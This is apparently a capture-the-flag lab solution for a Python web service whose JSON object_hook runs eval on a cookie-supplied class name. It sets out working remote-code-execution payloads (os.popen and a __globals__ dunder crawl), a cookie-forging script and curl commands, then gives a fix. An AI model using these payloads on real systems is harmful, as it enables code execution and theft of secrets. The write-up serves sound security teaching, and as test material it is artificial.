# w08 Deser Zone :: solution

## Root cause

`app/server.py`, `_revive()` — the `object_hook` the profile deserializer runs
for every JSON object in the document:

```python
def _revive(spec):
    if not isinstance(spec, dict) or "__class__" not in spec:
        return spec
    name = spec["__class__"]
    try:
        # --- the bug ------------------------------------------------------
        cls = eval(str(name), _ZONE_TYPES)
        return cls(*spec.get("args", ()))
        # ------------------------------------------------------------------
    except Exception as exc:  # unknown class -> leave the raw document
        return {"__class__": name, "error": f"{type(exc).__name__}: {exc}",
                "doc": spec}
```

Two things are wrong, and either one alone is enough:

1. **`eval` on attacker-controlled text.** `_ZONE_TYPES` is a namespace, not a
   sandbox. `eval(expr, globals)` only *prepends* those globals to the name
   lookup — the expression itself may contain calls, attribute access and
   subscripts, and `__builtins__` is injected automatically when absent. So
   `"__import__('os').popen"` resolves, and so does any dunder crawl.
2. **The class is constructed during deserialization.** `cls(*args)` is called
   as the document is parsed, so the payload fires inside `json.loads()`, before
   any application validation could run. Deserialization *is* execution.

The handler then makes the result readable:

```python
def _describe(profile):
    ...
    if isinstance(profile, (str, bytes)):
        messages = [profile]
    elif hasattr(profile, "read"):  # file objects, e.g. os.popen
        messages = [profile.read()]
```

Whatever the deserializer produced is reflected back, so a callable that returns
a string or a file object puts its output straight into the HTTP response.

This lab is deliberately **not** `pickle` (that is w14). The vulnerable
primitive here is the JSON object hook, which is where real-world Python
services usually grow `json.loads(..., object_hook=...)` "so we can have typed
objects".

## Recon

```bash
curl -s http://localhost:30008/api/health
# {"service": "deser-zone", "lab": "w08", "version": "1.08.0",
#  "profile_cookie": "dz_profile", "serializer": "json+object_hook", ...}
```

The landing page prints a freshly minted cookie. It is just base64:

```bash
echo 'eyJfX2NsYXNzX18iOiAiUGxheWVyUHJvZmlsZSIsICJhcmdzIjogWyJndWVzdCIsICJjeWJlcnB1bmsiLCBbInpvbmU6IHNlYWxlZCJdXX0=' | base64 -d
# {"__class__": "PlayerProfile", "args": ["guest", "cyberpunk", ["zone: sealed"]]}
```

That is the whole format: the cookie names its own class and passes positional
constructor arguments. The contract is *documented on the page* — the challenge
is what to put in it.

The sealed route is genuinely sealed:

```bash
curl -s http://localhost:30008/api/zone
# {"zone": "sealed", "note": "the zone is not a profile field and no route opens it"}
```

`app/flag.txt` is a decoy placeholder. The real value is `W0B_FLAG` in the
process environment — there is no file to read and no route to GET.

## Exploit

Any class name that, evaluated, yields a callable, plus args, is a gadget. Two
variants; both were tested.

**A. The short one — `eval` takes an expression, so just write the expression:**

```json
{"__class__": "__import__('os').popen", "args": ["printf %s \"$W0B_FLAG\""]}
```

`cls` is `os.popen`, `cls(*args)` opens the command, and the returned file object
is reflected by `_describe` after `.read()`.

**B. The dunder crawl — the one a hardened type table would still not stop:**

```python
PlayerProfile.__init__.__globals__['__builtins__'].eval
```

A class object carries its defining module's globals. In an *imported* module's
globals `__builtins__` is the builtins **module**, so the member is reached with
a plain attribute (`.eval`); the `['eval']` subscript form fails with
`TypeError: 'module' object is not subscriptable`. Even if the zone's type table
were emptied, `PlayerProfile` names a class and the class names its globals.

Build and send the cookie:

```bash
COOKIE=$(python - <<'PY'
import base64, json
doc = {"__class__": "PlayerProfile.__init__.__globals__['__builtins__'].eval",
       "args": ["__import__('os').popen('printf %s \"$W0B_FLAG\"').read()"]}
print(base64.urlsafe_b64encode(json.dumps(doc).encode()).decode())
PY
)
curl -s --cookie "dz_profile=$COOKIE" http://localhost:30008/api/profile
# {"cookie_present": true, "profile": {"user": "guest", "theme": "cyberpunk",
#  "messages": ["hex4b0t{...}"]}}
```

Or run the bundled script:

```bash
python solution/exploit.py
# [*] target      http://localhost:30008
# [*] service     deser-zone v1.08.0 (lab w08)
# [*] serializer  json+object_hook
# [*] benign profile -> {'user': 'guest', 'theme': 'cyberpunk', 'messages': ['zone: sealed']}
# [*] payload     {"__class__": "PlayerProfile.__init__.__globals__['__builtins__'].eval",...
# [+] FLAG: hex4b0t{verifytest123456}
```

No out-of-band channel is needed: `_describe` reflects the object the hook
returned, so command output comes back in the HTTP response.

## Why the type table does not save it

`_ZONE_TYPES = {"PlayerProfile": PlayerProfile}` looks like an allow-list, and
under a name-lookup-only design it would be. But `eval` is not a dictionary
lookup: it is a compiler and evaluator for arbitrary expressions. An allow-list
that is passed as the *globals* of an unrestricted `eval` is decoration. The
allow-list must be the thing that resolves the name and the constructor must not
be reachable at parse time.

## The fix

1. **Never `eval` a class name.** Map names to types with a real lookup and
   refuse anything not in the table:

   ```python
   cls = _ZONE_TYPES.get(name)
   if cls is None:
       return spec           # unknown type: leave the raw document
   ```

2. **Do not construct attacker-named classes while deserializing.** Prefer a
   plain-data format: `json.loads(raw)` with no hook, and build the profile in
   application code from known fields. If a hook is unavoidable, restrict it to
   *plain data* — return `spec` unchanged and never call anything.
3. **Sign the cookie.** The cookie is client-controlled state; an HMAC (or a
   server-side session id) means an unsigned document never reaches the
   deserializer at all. Note this alone is not sufficient — key management
   fails — so it complements, never replaces, (1) and (2).
4. **Treat every deserializer as a parser for a language with a call
   primitive.** `pickle`, `yaml.load`, `marshal`, `json` + `object_hook` that
   instantiates, Java `ObjectInputStream`, PHP `unserialize` — all of them turn
   bytes into behaviour. Inputs at a trust boundary get the data-only parser,
   nothing else.

```python
PROFILE_FIELDS = ("user", "theme", "messages")

def load_profile(raw):
    doc = json.loads(raw)                       # no hook, no calls
    if not isinstance(doc, dict):
        raise ValueError("profile must be an object")
    return PlayerProfile(**{k: doc[k] for k in PROFILE_FIELDS if k in doc})
```

## Flag

Injected at runtime into `W0B_FLAG`. There is no static value to hardcode, and
no route returns it — the only path is code execution inside the process.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
